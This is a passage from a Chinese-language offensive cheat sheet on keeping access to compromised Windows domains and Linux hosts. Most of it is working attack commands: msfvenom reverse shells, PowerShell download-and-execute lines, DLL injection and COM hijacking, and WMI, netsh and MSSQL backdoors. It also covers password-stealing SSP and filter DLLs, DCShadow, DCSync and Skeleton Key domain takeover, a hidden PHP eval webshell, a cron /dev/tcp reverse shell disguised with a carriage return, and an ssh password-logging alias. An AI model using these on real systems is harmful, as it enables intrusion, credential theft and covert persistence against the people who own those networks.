function Invoke-ScheduledTaskComHandlerUserTask { [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')] Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [String] $Command, [Switch] $Force ) $ScheduledTaskCommandPath = "HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32" if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){ New-Item $ScheduledTaskCommandPath -Force | New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null }else{ Write-Verbose "Key already exists, consider using -Force" exit } if (Test-Path $ScheduledTaskCommandPath) { Write-Verbose "Created registry entries to hijack the UserTask" }else{ Write-Warning "Failed to create registry key, exiting" exit } }
Invoke-ScheduledTaskComHandlerUserTask -Command "C:\test\testmsg.dll" -Verbose
重启权限可维持
```

### DLL注入  dll_4)

#### Powershell  powershell_8)

```
生成DLL
>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=6666 -f dll -o /var/www/html/x.dll
>use exploit/multi/handler
>set payload windows/x64/meterpreter/reverse_tcp
>Powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.105/powersploit/CodeExecution/Invoke-DllInjection.ps1'); Invoke-DllInjection -ProcessID pid -Dll .\1.dll"
```

#### InjectProc  injectproc)

```
生成DLL
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/qq.dll
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse_tcp
使用如下命令注入进程
>InjectProc.exe dll_inj qq.dll xx.exe(存在的进程)
```

![image](http://159.75.51.84:8000/img/477.png)

### 通过控制面板加载项维持权限  _119)

```
编译为dll，这里是弹框测试
#include <Windows.h>
#include "pch.h"

//Cplapplet
extern "C" __declspec(dllexport) LONG Cplapplet(
    HWND hwndCpl,
    UINT msg,
    LPARAM lParam1,
    LPARAM lParam2
)
{
    MessageBoxA(NULL, "inject control panel.", "Control Panel", 0);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        Cplapplet(NULL, NULL, NULL, NULL);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

![image](http://159.75.51.84:8000/img/680.png)

```
添加到注册表中，只要运行control命令打开控制面板即可加载dll
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v spotless /d "C:\xxx\dll.dll" /f
```

![image](http://159.75.51.84:8000/img/681.png)

## 通过自定义.net垃圾回收机制进行DLL注入  netdll)

```
低权限用户可指定.net应用程序使用自定义垃圾收集器（GC），一个自定义GC可以以COMPLUS_GCName此环境变量指定，只需将此环境变量指向到恶意DLL，自定义GC的DLL需要一个名为GC_VersionInfo的导出表。
下面是个弹框DLL
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

struct VersionInfo
{
    UINT32 MajorVersion;
    UINT32 MinorVersion;
    UINT32 BuildVersion;
    const char* Name;

};

extern "C" __declspec(dllexport) void GC_VersionInfo(VersionInfo * info)
{
    info->BuildVersion = 0;
    info->MinorVersion = 0;
    info->BuildVersion = 0;
    MessageBoxA(NULL, "giao", "giao", 0);
}
```

![image](http://159.75.51.84:8000/img/686.png)

```
后执行任意.net程序可加载此DLL
```

![image](http://159.75.51.84:8000/img/687.png)

```
当然也可以加载shellcode
https://github.com/am0nsec/MCGC
```

![image](http://159.75.51.84:8000/img/688.png) ![image](http://159.75.51.84:8000/img/689.png) ![image](http://159.75.51.84:8000/img/690.png)

### Windows FAX DLL Injection  windows-fax-dll-injection)

```
恶意DLL改名为fxsst.dll放置在c:\windows\目录即可实现对explorer.exe的劫持
```

### DSRM+注册表ACL后门  dsrmacl)

```
>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
允许DSRM账户远程访问
https://github.com/HarmJ0y/DAMP
效果：域内任何用户可读取域控hash
system权限执行
>psexec.exe -accepteula -s -i -d cmd.exe
域控制器执行
PS>Add-RemoteRegBackdoor -ComputerName 域控名 -Trustee 'S-1-1-0' –Verbose
```

![image](http://159.75.51.84:8000/img/478.png)

```
域内机器执行
https://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1
PS> Get-RemoteLocalAccountHash -ComputerName 域控 –Verbose
```

![image](http://159.75.51.84:8000/img/479.png)

```
域控上执行
>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
```

![image](http://159.75.51.84:8000/img/480.png)

```
PTH攻击，mimikatz需以管理员身份启动
>mimikatz "privilege::debug" "sekurlsa::pth /domain:dc /user:Administrator /ntlm:9f1770aebd442b6b624bdfe9cbc720dd" exit
```

![image](http://159.75.51.84:8000/img/481.png)

### DCShadow&SID History  dcshadowsid-history)

```
http://192.168.0.107/ps/nishang/ActiveDirectory/Set-DCShadowPermissions.ps1
DCShadow攻击是通过更改AD架构，使域内一台机器伪造成域控。
此脚本可以通过修改AD对象提供DCShadow攻击的最小权限。
运行此脚本需要DA(Domain Administrator)权限，可以使指定用户不需要DA权限使用mimikatz。
域控：dc.zone.com
域内机器：sub2k8.zone.com
域内普通用户:y
域控执行
>Set-DCShadowPermissions -Fakedc sub2k8 -Object dc -username y –Verbose
注册sub2k8为假DC，给予用户y从sub2k8修改dc的计算机对象的权限。
```

![image](http://159.75.51.84:8000/img/482.png)

```
在sub2k8上，以本地system权限启动一个mimikatz会话，以zone\y权限启动一个mimikatz会话。
```

![image](http://159.75.51.84:8000/img/483.png) ![image](http://159.75.51.84:8000/img/484.png)

```
System权限窗口执行dcshadow攻击，修改dc的计算机属性
Zone\y权限窗口用于推送
添加域管理
通过修改安全标识符，将域内普通用户y提升为域管理用户
>lsadump::dcshadow /object:y /attribute:primaryGroupID /value:512
```

![image](http://159.75.51.84:8000/img/485.png) ![image](http://159.75.51.84:8000/img/486.png) ![image](http://159.75.51.84:8000/img/487.png)

```
Zone\y推送
>lsadump::dcshadow /push
```

![image](http://159.75.51.84:8000/img/488.png)

```
此时在域控上查询可见y用户已经加入域管理组。
```

![image](http://159.75.51.84:8000/img/489.png)

```
添加SIDHistory后门
记录域管理SID
```

![image](http://159.75.51.84:8000/img/490.png)

```
>Set-DCShadowPermissions -FakeDC sub2k8 -Object y -Username y -Verbose
```

![image](http://159.75.51.84:8000/img/491.png)

```
>lsadump::dcshadow /object:y /attribute:sidhistory /value:S-1-5-21-2346829310-1781191092-2540298887-500
推送
>lsadump::dcshadow /push
```

![image](http://159.75.51.84:8000/img/492.png)

```
测试
```

![image](http://159.75.51.84:8000/img/493.png)

```
域控中通过mimikatz命令可查询到SIDHistory
```

![image](http://159.75.51.84:8000/img/494.png)

```
删除SIDHistory的方法
PS>Get-ADUser -Filter {name -eq "y"} –Properties sidhistory|foreach {Set-ADuser $_ –remove @{sidhistory="S-1-5-21-2346829310-1781191092-2540298887-500"}}
```

![image](http://159.75.51.84:8000/img/495.png) ![image](http://159.75.51.84:8000/img/496.png)

```
删除功能规则
输入的规则后面加参数-remove即可。
```

![image](http://159.75.51.84:8000/img/497.png)

### DCSync后门  dcsync)

```
服务器管理器找到域->查看->启用高级功能->右键属性->安全->everyone完全控制
>mimikatz.exe "lsadump::dcsync /domain:zone.com /user:administrator" exit
```

![image](http://159.75.51.84:8000/img/498.png)

```
或使用powerview添加一条ACL(域控执行)
>Add-DomainObjectAcl -TargetIdentity "DC=ZONE,DC=COM" -PrincipalIdentity 域内用户 -Rights DCSync -Verbose
```

![image](http://159.75.51.84:8000/img/499.png)

```
使用此账户在域内任意主机可使用mimikatz的dcsync功能导出凭据
```

![image](http://159.75.51.84:8000/img/500.png)

```
移除ACL
>Remove-DomainObjectAcl -TargetIdentity "DC=zone,DC=com" -PrincipalIdentity 用户 -Rights DCSync -Verbose
```

### Netsh Helper DLL  netsh-helper-dll)

```
https://github.com/outflanknl/NetshHelperBeacon
https://github.com/rtcrowley/Offensive-Netsh-Helper
```

#### MSFvenom生成DLL  msfvenomdll)

```
生成DLL格式木马
```

![image](http://159.75.51.84:8000/img/501.png)

```
传至靶机执行命令
>netsh add helper C:\Windows\Temp\help.dll
```

![image](http://159.75.51.84:8000/img/502.png)

#### MSF+web_delivery  msfweb_delivery)

```
关闭netsh权限不会掉，调用的powershell
#use exploit/multi/script/web_delivery
>set target 2            #PSH
>set payload windows/x64/meterpreter/reverse_tcp
>set lhost 192.168.0.107
>set lport 12345
```

![image](http://159.75.51.84:8000/img/503.png)

```
Visual Studio新建空白DLL项目，源文件添加现有文件
https://github.com/rtcrowley/Offensive-Netsh-Helper/blob/master/netshlep.cpp 
复制生成的代码进文件中，配置管理器新建x64位数后生成解决方案，配置类型选择位动态库复制DLL到靶机执行
```

![image](http://159.75.51.84:8000/img/504.png) ![image](http://159.75.51.84:8000/img/505.png)

```
>netsh add helper helper.dll
```

![image](http://159.75.51.84:8000/img/506.png)

#### MSF&Shellcode  msfshellcode)

```
关闭netsh后权限会掉
https://github.com/outflanknl/NetshHelperBeacon
MSFvenom生成.c格式
>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f c -o /var/www/html/1.c
Visual Studio打开项目
若系统是64位需设置配置管理器为64位项目，反之32(解决方案右键属性)
```

![image](http://159.75.51.84:8000/img/507.png)

```
将MSF生成shellcode粘贴进相应位置后生成解决方案。
```

![image](http://159.75.51.84:8000/img/508.png) ![image](http://159.75.51.84:8000/img/509.png)

```
会在项目目录x64/Release下生成dll
复制DLL到靶机system32目录下，执行命令
>netsh add helper C:\Windows\System32\NetshHelperBeacon.dll
```

![image](http://159.75.51.84:8000/img/510.png)

```
只要启动netsh就会触发
```

![image](http://159.75.51.84:8000/img/511.png)

### MSSQL后门  mssql_2)

```
注册表自启动
>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1');Get-SQLPersistRegRun -Verbose -Name Update -Command 'c:\windows\temp\Update.exe' -Instance "zone.com\sub2k8""
重启MSSQL上线(需重启服务)
http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1
>powershell -ep bypass 
>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1') 
>Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "zone.com\sub2k8" -PsCommand "IEX(new-object net.webclient).downloadstring('http://192.168.0.107/xxxx')" 远程木马脚本可用CS/Empire生成
>net stop mssqlserver
>net start mssqlserver
映像劫持
>powershell -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1');Get-SQLPersistRegDebugger -Verbose -FileName sethc.exe -Command "c:\windows\system32\cmd.exe" -Instance "zone.com\sub2k8""
DDL事件触发
>powershell -exec bypass 
>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/PowerUpSQL/Invoke-SqlServer-Persist-TriggerDDL.psm1') 
>Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance "zone\sub2k8" -PsCommand "IEX(new-object net.webclient).downloadstring('http://192.168.0.107/xxxx')"  远程木马文件可用CS/Empire生成
>Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance " zone\sub2k8" -Remove   移除后门
```

### NSSM  nssm)

```
http://www.nssm.cc/release/nssm-2.24.zip
NSSM封装可执行程序为系统服务
>nssm install 服务名称会自动弹出设置
```

![image](http://159.75.51.84:8000/img/512.png)

```
Path选择powershell的路径，arguments直接输入参数。
启动服务
>nssm start 服务名称
```

![image](http://159.75.51.84:8000/img/513.png)

```
会上线
```

![image](http://159.75.51.84:8000/img/514.png)

```
重启电脑，权限也会维持
删除服务
>nssm remove <servicename>
```

![image](http://159.75.51.84:8000/img/515.png)

### 添加签名  _120)

```
https://github.com/secretsquirrel/SigThief
>python sigthief.py -i 被窃取的文件 -t 要添加签名的恶意文件 -o 保存文件
>python sigthief.py -i rarext.dll -t rarextdwa.dll -o 1.dll
```

![image](http://159.75.51.84:8000/img/516.png) ![image](http://159.75.51.84:8000/img/517.png) ![image](http://159.75.51.84:8000/img/518.png) ![image](http://159.75.51.84:8000/img/519.png)

### Metsvc  metsvc)

```
Meterpreter> run metsvc -A
在C:Windows\TEMP下随机生成目录三个文件，创建服务metsvc 31337端口
连接后门
Msf>use exploit/multi/handler
Msf>set payload windows/metsvc_bind_tcp
Msf>set rhost 192.168.1.2
Msf>set rport 31337
Msf>run
删除服务
Meterpreter > run metsvc –r
```

### Persistence  persistence_1)

```
Meterpreter>run persistence -X -i 10 -r 192.168.1.9 -p 4444
-X系统启动时运行
-i每隔10秒尝试连接服务端
连接后门
Msf>use exploit/multi/handler
Msf>set payload windows/meterpreter/reverse_tcp
Msf>set lhost 192.168.1.1
Msf>set lport 4444
Msf>run
```

### HookPasswordChangeNotify  hookpasswordchangenotify)

```
使用VS2015开发环境，MFC设置为在静态库中使用MFC
编译工程，生成HookPasswordChange.dll
https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
在代码尾部添加如下代码：
>Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
并命名为HookPasswordChangeNotify.ps1
上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll
管理员权限执行
>PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
C:\Windows\Temp下可以找到passwords.txt
&
https://gitee.com/RichChigga/PasswordchangeNotify
上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll 管理员权限执行：
>PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
在C:\Windows\System32 新建文件system.ini第一行是连接的ip 第二行是端口
```

![image](http://159.75.51.84:8000/img/520.png)

### NPPSpy记录密码  nppspy)

```
https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/NPPSPy.c
默认保存位置是C盘根目录，可以修改重新编译
```

![image](http://159.75.51.84:8000/img/729.png)

```
将DLL放入system32文件夹内
```

![image](http://159.75.51.84:8000/img/730.png)

```
执行ps1脚本自动添加注册表
```

![image](http://159.75.51.84:8000/img/731.png)

```
无需重启
```

![image](http://159.75.51.84:8000/img/732.png)

### Password Filter DLL  password-filter-dll)

```
https://github.com/3gstudent/PasswordFilter
visualstudio生成解决方案
DLL放在%windir%\system32\下
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的Notification Packages，添加Win32Project3
```

![image](http://159.75.51.84:8000/img/521.png)

```
>REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0rassfm\0Win32Project3" /f
重启之后只要修改用户的密码，即可记录
```

![image](http://159.75.51.84:8000/img/522.png)

```
文件默认在C盘根目录，可在源码中修改
```

![image](http://159.75.51.84:8000/img/523.png)

### WMIC事件订阅  wmic_4)

```
每隔30秒加载一次payload
>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
>wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23",CommandLineTemplate="远程调用(powershell,regsvr32,mshta等)"
>wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
```

![image](http://159.75.51.84:8000/img/524.png)

```
重启维持
卸载后门
>Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose
>Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose
>Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose
```

### WMI-Persistence  wmi-persistence)

```
https://gitee.com/RichChigga/WMI-Persistence
cobalt strike ->payload generator->powershell(use x64)
```

![image](http://159.75.51.84:8000/img/525.png)

```
attack->文件下载，文件选择payload generator的脚本，local uri为随意文件
```

![image](http://159.75.51.84:8000/img/526.png)

```
生成后地址替换进WMI-Persistence脚本内
```

![image](http://159.75.51.84:8000/img/527.png)

```
# powershell -exec bypass
PS > Import-Module .\WMI-Persistence.ps1
PS > Install-Persistence
```

![image](http://159.75.51.84:8000/img/528.png)

```
PS > Check-WMI  重启后即可上线system权限(要等待4-6分钟)
```

![image](http://159.75.51.84:8000/img/529.png)

```
自定义上线
```

![image](http://159.75.51.84:8000/img/530.png)

```
attack->文件下载，exe木马指定为文件。local uri为随意文件，wmi.xsl放在web目录
```

![image](http://159.75.51.84:8000/img/531.png)

```
修改wmi.xsl
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c certutil -urlcache -split -f http://192.168.0.107/load.jpg %temp%/load.exe & %temp%/load.exe & certutil.exe -urlcache -split -f http://192.168.0.107/load.jpg delete",0);
    ]]> </ms:script>
</stylesheet>
```

![image](http://159.75.51.84:8000/img/532.png)

```
WMI-Persistence脚本修改payload地址为wmi.xsl
$finalPayload=" wmic os get /FORMAT:`"$Payload`""
```

![image](http://159.75.51.84:8000/img/533.png)

```
>powershell -exec bypass
PS > Import-Module .\WMI-Persistence.ps1
PS > Install-Persistence
PS > Check-WMI
PS > Remove-Persistence 删除模块
重启后即可上线
```

![image](http://159.75.51.84:8000/img/534.png)

### Invoke-Tasksbackdoor  invoke-tasksbackdoor)

```
>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.103/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method nccat -ip 192.168.0.103 -port 9999 -time 2"
> powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.103/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 192.168.0.103 -port 8081 -time 2"
```

![image](http://159.75.51.84:8000/img/535.png)

### Invoke-ADSBackdoor  invoke-adsbackdoor)

```
使用ADS创建一个隐藏文件，创建一个计划任务每隔一分钟请求一次攻击。
>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Backdoors/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor -PayloadURL http://192.168.0.107/ps/Schtasks-Backdoor.ps1 -Arguments 'Invoke-Tasksbackdoor -method nccat -ip 192.168.0.107 -port 12138 -time 1'"
```

![image](http://159.75.51.84:8000/img/536.png) ![image](http://159.75.51.84:8000/img/537.png) ![image](http://159.75.51.84:8000/img/538.png) 生成 >msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.107 LPORT=12138 -f powershell -o /var/www/html/ads #use exploit/multi/handler #set payload windows/x64/meterpreter/reverse_https #run

### ADS隐藏webshell  adswebshell)

```
指定宿主文件，index.php是网页正常文件
>echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg
<?php include(‘index.php:hidden.jpg’)?>
<?php 
$a="696E6465782E7068703"."A68696464656E2E6A7067";#hex编码
$b="a";
include(PACK('H*',$$b))
?>
>echo 9527 > 1.txt:flag.txt
>notepad 1.txt:flag.txt
或不指定宿主文件
>echo hide > :key.txt
>cd ../
>notepad test:key.txt
上传处绕过
```

| 上传的文件名                | 服务器表面现象     | 生成的文件内容     |
| :-------------------------- | :----------------- | :----------------- |
| test.php:a.jpg              | 生成test.php       | 空                 |
| test.php::$DATA             | 生成test.php       | <?php phpinfo();?> |
| test.php::$INDEX_ALLOCATION | 生成test.php文件夹 | \                  |
| test.php::$DATA\0.jpg       | 生成0.jpg          | <?php phpinfo();?> |

### ADS&JavaScript  adsjavascript)

```
创建一个txt文件，test.txt，随便添加内容（实际的工具，即用户要用的那个工具）。
将程序写入文件流（此处用calc.exe）
>type calc.exe > test.txt:calc.exe
使用mklink创建文件链接：
>mklink config.txt test.txt:calc.exe
创建readme.txt，文件内容随便。设置为隐藏。
创建readme.js，内容如下：
var objShell = new ActiveXObject("shell.application");
objShell.ShellExecute("cmd.exe", "/c config.txt", "", "open", 0);
objShell.ShellExecute("README.txt", "", "", "open", 1);
执行readme.js，运行calc.exe ，打开readme.txt
```

### Empire  empire_5)

#### LNK后门  lnk)

```
Empire
Empire> set Host http://192.168.1.150
Empire> set Port 8080
>launcher powershell Listener's Name
生成后只使用Base64的代码。
>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1');Invoke-BackdoorLNK -LNKPath 'C:\Users\Administrator.DC\Desktop\Easy CHM.lnk' -EncScript Base64编码"
```

![image](http://159.75.51.84:8000/img/539.png) ![image](http://159.75.51.84:8000/img/540.png) ![image](http://159.75.51.84:8000/img/541.png) ![image](http://159.75.51.84:8000/img/542.png)

```
清除后门
>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1');Invoke-BackdoorLNK -LNKPath 'C:\Users\Administrator.DC\Desktop\Easy CHM.lnk' -CleanUp"
```

![image](http://159.75.51.84:8000/img/543.png)

#### WMI  wmi_3)

```
Empire>powershell/persistence/elevated/wmi
```

### 注入SSP被动收集密码  ssp_1)

```
需高权限
```

#### Mimikatz  mimikatz_6)

```
重启失效
>privilege::debug
>misc::memssp
锁屏
>rundll32.exe user32.dll,LockWorkStation
```

![image](http://159.75.51.84:8000/img/544.png)

```
登录的账号密码保存在
C:\Windows\System32\mimilsa.log
```

![image](http://159.75.51.84:8000/img/545.png)

```
重启有效
将mimikatz中的mimilib.dll放入system32目录
>reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages" 查看注册表
>reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ  添加mimilib
```

![image](http://159.75.51.84:8000/img/546.png)

```
有账号登录密码保存在C:\Windows\System32\kiwissp.log重启也有效
```

![image](http://159.75.51.84:8000/img/547.png)

#### Empire  empire_6)

```
复制mimilib.dll到system32文件夹中
>shell copy mimilib.dll C:\Windows\System32\
使用模块
>usemodule persistence/misc/install_ssp*
>set Path C:\Users\Administrator\mimilib.dll
```

#### Powersploit  powersploit_2)

```
>Import-Module .\PowerSploit.psm1
>Install-SSP -Path .\mimilib.dll
```

### 基于域策略文件权限后门  _121)

```
域的组策略和脚本存放在域控机的C:\Windows\SYSVOL\sysvol\zone.com\Policies目录，域内机器定时访问以更新策略
域控机设置policies为everyone完全控制
>cacls C:\Windows\SYSVOL\sysvol\zone.com\Policies /e /t /c /g "EveryOne":f
```

![image](http://159.75.51.84:8000/img/548.png)

```
使用powerview查询域内机对应策略文件
PS> Get-NETGPO -ComputerName sub2k8.zone.com |fl gpcfilesyspath
打开C:\Windows\SYSVOL\sysvol\zone.com\Policies\{id}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf末尾添加
[Registry Values] MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger=1,c:\windows\system32\calc.exe [Version] signature="$CHICAGO$" Revision=1
手动刷新策略
>gpupdate /force
劫持taskhost.exe，可替换c:\windows\system32\calc.exe为后门文件或语句。
```

### Kerberoasting后门  kerberoasting_1)

```
当有setspn权限时，为域用户添加一个SPN
>setspn -U -A RDP/zone.com godadmin
```

![image](http://159.75.51.84:8000/img/549.png)

```
域内任何主机可以使用Kerberoast 获得TGS
https://github.com/malachitheninja/Invoke-Kerberoast
```

![image](http://159.75.51.84:8000/img/550.png)

```
>Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation |Out-File xx.txt
```

![image](http://159.75.51.84:8000/img/551.png)

```
或使用rubeus.exe
```

![image](http://159.75.51.84:8000/img/552.png)

```
破解
>hashcat -m 13100 -a 0 kerberos.txt wordlist.txt
```

### S4U2Self后门  s4u2self)

```
域控执行，寻找具备SPN且密码永不过期的账户
>Get-ADUser -Filter * -Properties ServicePrincipalName,PasswordNeverExpires| ? {($_.ServicePrincipalName -ne "") -and ($_.PasswordNeverExpires -eq $true)}
```

![image](http://159.75.51.84:8000/img/553.png)

```
使用mimikatz的dcsync提取用户hash
>lsadump::dcsync /domain:zone.com /user:y
```

![image](http://159.75.51.84:8000/img/554.png)

```
布置后门
>Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount 账户
```

![image](http://159.75.51.84:8000/img/555.png)

```
布置完成后利用，登录账户y
触发后门
>Rubeus.exe s4u /user:y /aes256:{aes256} /domain:zone.com /msdsspn:krbtgt /impersonateuser:godadmin
```

![image](http://159.75.51.84:8000/img/556.png)

```
注入票据，获取域控的CIFS、LDAP服务
>Rubeus.exe asktgs /ticket:{} /service:cifs/dc.zone.com,ldap/dc.zone.com /ptt
```

![image](http://159.75.51.84:8000/img/557.png) ![image](http://159.75.51.84:8000/img/558.png) ![image](http://159.75.51.84:8000/img/559.png) ![image](http://159.75.51.84:8000/img/560.png)

### 受限委派后门  _122)

```
http://192.168.0.107/ps/nishang/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1
新增一个受限委派服务账户，或添加受限委派后门功能给一个已知账户密码存在的服务账户。
需运行在域控制器上，本次演示的是新建后门账户，若是给已知账户密码的服务账户添加功能，步骤一致。
PS > Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain zone.com -AllowedToDelegateTo ldap/dc.zone.com
密码默认为Password@123!可以修改脚本中$Password参数修改密码。
```

![image](http://159.75.51.84:8000/img/561.png) ![image](http://159.75.51.84:8000/img/562.png)

```
https://github.com/samratashok/ADModule
导入ADModule中的Microsoft.ActiveDirectory.Management.dll和Import-ActiveDirectory.ps1
>Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
>Import-Module Import-ActiveDirectory.ps1
现以域内普通用户y登录一台域内机器sub2k8，使用kekeo获取TGT
Kekeo#tgt::ask /user:backdoor /domain:zone.com /password:Passowrd@123!
```

![image](http://159.75.51.84:8000/img/563.png)

```
Kekeo#tgs::s4u /tgt:TGT_backdoor@ZONE.COM_krbtgt~zone.com@ZONE.COM.kirbi /user:godadmin@zone.com /service:ldap/dc.zone.com获取以域管理身份访问ldap的TGS
```

![image](http://159.75.51.84:8000/img/564.png)

```
使用mimikatz写入TGS票据
mimikatz#kerberos::ptt C:\Users\y.ZONE\Desktop\kekeo\x64\TGS_godadmin@zone.com@ZONE.COM_ldap~dc.zone.com@ZONE.COM.kirbi
```

![image](http://159.75.51.84:8000/img/565.png)

```
接下来就可以dcsync导出krbtgt的hash，通过krbtgt伪造黄金票据
mimikatz#lsadump::dcsync /user:krbtgt /domain:zone.com
```

![image](http://159.75.51.84:8000/img/566.png)

### Skeleton Key万能钥匙  skeleton-key)

```
域控上使用mimikatz执行
>privilege::debug
>misc::skeleton
```

![image](http://159.75.51.84:8000/img/567.png)

```
可以使用域内任何账号以密码mimikatz登录任意域内主机
使用Empire模块
>usemodule persistence/misc/skeleton_key*
绕过LSA Protection
>privilege::debug
>!+
>!processprotect /process:lsass.exe /remove
>misc::skeleton
```

### 唯一IP访问  ip_1)

```
>msfvenom -p windows/shell_hidden_bind_tcp LPORT=443 AHOST=192.168.0.107 -f exe > svchost.exe
只有当107这台机器连接时可获得shell，其他机器不可以。
```

![image](http://159.75.51.84:8000/img/568.png) ![image](http://159.75.51.84:8000/img/569.png) ![image](http://159.75.51.84:8000/img/570.png)

### Linux cron后门  linux-cron)

```
>msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.107 LPORT=12138 -f raw > /var/www/html/shell.sh
(crontab -l;printf "*/1 * * * * /bin/bash /tmp/shell.sh;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
```

![image](http://159.75.51.84:8000/img/571.png)

| `1`  | `(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.1.1/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab - ` |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

### Strace记录ssh密码  stracessh)

```
安装strace
#apt-get install strace
#vi ~/.bashrc
添加
alias ssh='strace -o /tmp/.log -e read,write,connect -s 2048 ssh'
```

### SSHD后门  sshd)

```
